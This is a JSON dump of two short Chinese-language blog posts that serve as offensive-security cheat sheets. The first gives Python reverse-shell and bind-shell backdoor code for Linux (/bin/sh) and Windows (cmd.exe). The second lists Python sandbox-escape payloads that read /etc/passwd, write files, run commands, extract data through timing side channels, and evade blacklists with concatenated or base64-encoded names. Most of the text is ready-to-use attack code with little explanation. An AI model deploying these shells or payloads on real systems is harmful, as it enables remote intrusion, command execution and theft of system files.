[{"title":"Python Shell","url":"/2018/09/20/Python-Shell/","content":"\n## Python反向链接后门\n\n```\nimport socket, subprocess, os\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM\ns.connect((host,port))\nos.dup2(s.fileno(),0) # 0代表系统的stdin\nos.dup2(s.fileno(),1) # 1代表系统的stdout\nos.dup2(s.fileno(),2) # 2代表系统的stderr\np=subprocess.call([\"/bin/sh\",\"-i\"])\n```\n\n## Python正向链接后门\n\n### windows正向链接CmdShell\n\n```\nfrom socket import *\nimport subprocess\nimport os, threading\n\ndef send(talk, proc):\n        import time\n        while True:\n                msg = proc.stdout.readline()\n                talk.send(msg)\n                \nserver=socket(AF_INET,SOCK_STREAM)\nserver.bind(('0.0.0.0',port))\nserver.listen(5)\ntalk, addr = server.accept()\nprint(\"connecting \", addr)\nproc = subprocess.Popen('cmd.exe /K', stdin=subprocess.PIPE,\n                stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n                shell=True)\nt = threading.Thread(target = send, args = (talk, proc))\nt.setDaemon(True)\nt.start()\nwhile True:\n    cmd=talk.recv(1024)\n    proc.stdin.write(cmd)\n    proc.stdin.flush()\nserver.close()\n```\n\n### linux版/bin/sh\n\n```\nfrom socket import *\nimport subprocess\nimport os, threading, sys\n\nserver=socket(AF_INET,SOCK_STREAM)\nserver.bind(('0.0.0.0',port))\nserver.listen(5)\ntalk, addr = server.accept()\nprint(\"connecting \", addr)\nproc = subprocess.Popen([\"/bin/sh\",\"-i\"], stdin=talk,\n                        stdout=talk, stderr=talk, shell=True)\n\n```\n\n","tags":["python"]},{"title":"Python 沙箱逃逸payload","url":"/2018/09/20/Python-沙箱逃逸payload/","content":"\n1. (type 'file')   读文件\n\n```\n().__class__.__bases__[0].__subclasses__()[40](\"/etc/passwd\").read()\n```\n2. (type 'file')   写文件\n\n```\n().__class__.__bases__[0].__subclasses__()[40](\"123.txt\",'w').write('asdfqwer')\n```\n\n3. (class 'warnings.catch_warnings')  命令执行\n\n```\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls\").read()')\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].os.system('ls')\n```\n4. timeit\n这个库主要是用来计时用的，用来计算函数的完成时间，后面的number=1表示函数只运行一次\n    提到timeit就由涉及到time based rce，这点跟mysq的时间延时注入很像，通过比对返回时间来获取文件内容\n    这里先来讲shell语句\n    if [ 1=1 ]; then sleep 2;fi;\n    if [ 1=2 ];then sleep 2 ;fi;\n    这里其实跟时间盲注是一个道理，，判断字符串然后返回时间，通过返回时间来进行比对，最终获取字符串\n\n```\n>> timeit.timeit(\"__import__('os').system('if [ $(whoami|cut -c 1) = y ];then sleep 2;fi;')\", number = 1)\n2.016458034515381\n>>> timeit.timeit(\"__import__('os').system('if [ $(whoami|cut -c 1) = q ];then sleep 2;fi;')\", number = 1)\n0.009487152099609375\n```\n5. platform\n这个库主要是用来识别系统什么的，这里其实最重要的是引入了popen来执行命令，因此也可用作命令执行\n\n```\nimport platform\nplatform.popen('ls').read()\n```\n6. 黑名单绕过\ndict 拼接函数\n\n```\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')\n```\nbase64拼接函数\n\n```\n().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['b3M='.decode('base64')].__dict__['c3lzdGVt'.decode('base64')]('ls')\n```","tags":["python"]}]